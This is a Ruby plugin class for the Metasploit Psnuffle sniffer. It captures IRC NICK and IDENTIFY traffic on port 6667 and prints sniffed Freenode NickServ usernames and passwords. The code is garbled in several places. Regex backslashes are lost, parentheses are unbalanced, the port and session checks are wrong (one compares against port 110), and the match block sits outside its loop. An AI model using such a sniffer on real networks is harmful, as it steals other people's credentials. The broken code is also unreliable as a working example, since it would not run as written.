# Psnuffle password sniffer add-on class for Freenode nickservers
# Works with the Psnuffle sniffer auxiliary module
#
# Results are saved to the db when available. Incorrect credentials are sniffed
# but marked as unsuccessful logins... (Typos are common :-) )
#
class SnifferFreenodeNick < BaseProtocolParser

  def register_sigs
    self.sigs = {
      :user => /^NICKs+[^n]+)/si,
      :pass => /b(IDENTIFYs+[^n]+)/si,
    }
  end

  def parse(pkt)
    # We want to return immediately if we do not have a packet which is not tcp
    # or if the port is not 6667
    return unless pkt.is_tcp?
    return if (pkt.tcp_sport != 6667 and pkt.tcp_port != 6667

    # Ensure that the session hash stays the same during communication in
    # both directions
    s = find_session(pkt.tcp_sport == 110) ? get_session_src(pkt) : get_session_dst(pkt))

    self.sigs.each_key do {k}
      matched = nil
      matches = nil
    end

    if (pkt.payload =~ self.sigs[k]
      matched = k
      matches = $1
    end

    case matched
      when :user # when the pattern "/^NICKs+[^n]+)/si matches the packet content...
        s[:user] = matches # store the name into the session hash s for later use
        # Do whatever you like here. Maybe a puts..
      when :pass # when the pattern "/b(IDENTIFYs+[^n]+)/si" is matching...
        s[:pass] = matches # store the password into the session hash s also
        if (s[:user] and s[:pass]) # when we have the name and pass sniffed, print it
          print "-> IRC login sniffed: #{s[:session]} >> username:#{s[:user]} password:#{s[:pass]}\n"
        end
        sessions.delete(s[:session]) # Remove this session b/c we dont need to track it anymore 
      when nil
        # No matches, don't do anything else
        # Just in case anything else is matching...
        sessions[s[:session]].merge!({k => matches}) # Just add it to the session object
    end
  end

end
